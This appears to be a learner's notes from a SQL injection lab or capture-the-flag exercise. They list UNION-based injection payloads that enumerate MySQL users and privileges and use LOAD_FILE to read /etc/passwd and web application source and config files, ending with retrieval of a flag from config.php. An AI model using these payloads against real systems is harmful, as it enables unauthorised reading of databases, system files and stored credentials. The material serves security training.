```sql
SELECT USER()
SELECT CURRENT_USER()
SELECT user from mysql.user

cn' UNION SELECT 1, user(), 3, 4-- -
```
```sql
cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -
```
`SELECT super_priv FROM mysql.user`
`cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -`
`cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`
If the query returns `Y` means the user has root privileges
`cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -`


From here, we can add `WHERE grantee="'root'@'localhost'"` to only show our current user `root` privileges. Our payload would be:
`cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`

### Loading a File
`SELECT LOAD_FILE('/etc/passwd');`
`cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`
`cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -`

#### Exercise
`cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -`
So then put in this command
`cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -`
Following that looked with `ctrl+u` to see where the file is coming from. 
Giving me config.php.
`cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 3, 4-- -`
Gave me the flag.